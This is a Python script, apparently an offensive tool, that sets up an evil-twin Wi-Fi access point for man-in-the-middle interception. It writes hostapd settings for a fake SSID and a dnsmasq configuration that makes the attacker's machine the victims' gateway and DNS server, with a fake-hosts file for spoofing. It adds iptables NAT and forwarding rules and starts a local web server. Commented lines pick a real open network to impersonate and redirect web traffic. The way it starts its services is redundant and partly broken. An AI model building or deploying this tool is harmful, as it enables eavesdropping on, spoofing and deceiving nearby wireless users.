import os

import sys
import signal
from multiprocessing import Process
from subprocess import Popen
import time

#mitm with internet connection

interface_wifi='wlan2mon'
open_ap=[]

try:
    interface=sys.argv[1]
    fake_ssid=sys.argv[2]
except:
    interface='wlan0'
    fake_ssid="null"

"""
try:
    fake_ssid=sys.argv[1]
except:
    
    with open("aps.txt") as f:
        open_ap=f.readlines()

    # change OPN with WEP/WPA/WPA2 or whatever you want to select a fake AP (first match) in aps.txt
    for i in open_ap:
        if "OPN" in i and "null" not in i:
            fake_ssid=i.split(" ")[1]
            break
"""
def ifconfig():
    os.system('ifconfig '+interface_wifi+' 10.0.0.1')

def iptables():
    os.system('iptables --flush')
    #os.system('iptables --table nat --append POSTROUTING --out-interface wlan1 -j MASQUERADE')
    os.system('iptables --table nat --append POSTROUTING --out-interface '+interface +' -j MASQUERADE')
    os.system('iptables --append FORWARD --in-interface '+interface_wifi+' -j ACCEPT')
    #os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 3113')
    #os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 80')
    #os.system('iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 80')
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')

def hostapd():
    l=['interface='+interface_wifi,'driver=nl80211','channel=1','hw_mode=g','ssid='+fake_ssid,'macaddr_acl=0','ignore_broadcast_ssid=0']
    with open('hostapd3.conf','w') as f:
        for i in l:
            f.write(i+'\n')
    os.system('hostapd hostapd3.conf')

def dnsmasq():
    l=['interface='+interface_wifi,'dhcp-range=10.0.0.10,10.0.0.250,12h','dhcp-option=3,10.0.0.1','dhcp-option=6,10.0.0.1','log-queries','log-dhcp','server=8.8.8.8','addn-hosts=fakehosts.conf','listen-address=127.0.0.1']#,'no-resolv']#,'no-dhcp-interface=','no-hosts']#,'listen-address=127.0.0.1','address=/google.com/10.0.0.1']#-H fakehosts.conf
    with open('dnsmasq3.conf','w') as f:
        for i in l:
            f.write(i+'\n')

    os.system('dnsmasq -C dnsmasq3.conf -d')
def apache():
    os.system('service apache2 start')

def signal_handler(sig,frame):
   
    p5.terminate()
    p5.join()
    
    Popen.terminate(p4)
    Popen.terminate(p6)
    
    os.system('iptables --flush')
    os.system('iptables --flush -t nat')
    os.system('iptables --delete-chain')
    os.system('iptables --table nat --delete-chain')
    sys.exit(0)


os.system('service NetworkManager restart')
time.sleep(1)
os.system('ifconfig wlan2mon down')
time.sleep(1)
os.system('iwconfig wlan2mon mode monitor')
time.sleep(1)
os.system('ifconfig wlan2mon up')
ifconfig()
iptables()
hostapd()
dnsmasq()
p5=Process(target=apache)
p5.start()

p4=Popen(['hostapd','hostapd3.conf'])
time.sleep(3)
p6=Popen(['dnsmasq','-C','dnsmasq3.conf','-d'])
time.sleep(3)

while 1:
    signal.signal(signal.SIGINT,signal_handler)
    signal.signal(signal.SIGTERM,signal_handler)

